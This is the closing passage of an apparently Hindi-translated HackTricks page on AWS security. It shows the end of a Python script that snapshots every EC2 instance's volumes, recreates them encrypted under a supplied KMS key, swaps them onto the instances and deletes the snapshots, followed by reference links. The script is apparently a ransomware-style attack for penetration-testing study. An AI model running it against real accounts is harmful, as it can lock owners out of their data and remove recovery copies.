instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, args.kms_key_arn)
replace_volumes(ec2_client, instance_volumes)
delete_snapshots(ec2_client, snapshot_ids)

if __name__ == "__main__":
main()
```
## संदर्भ

- [Latacora - ECS on EC2: IMDS Hardening में गैप्स को कवर करना](https://www.latacora.com/blog/2025/10/02/ecs-on-ec2-covering-gaps-in-imds-hardening/)
- [Latacora ecs-on-ec2-gaps-in-imds-hardening Terraform repo](https://github.com/latacora/ecs-on-ec2-gaps-in-imds-hardening)
- [Pentest Partners – AWS में SSM का उपयोग करके फ़ाइलें कैसे ट्रांसफर करें](https://www.pentestpartners.com/security-blog/how-to-transfer-files-in-aws-using-ssm/)

{{#include ../../../../banners/hacktricks-training.md}}
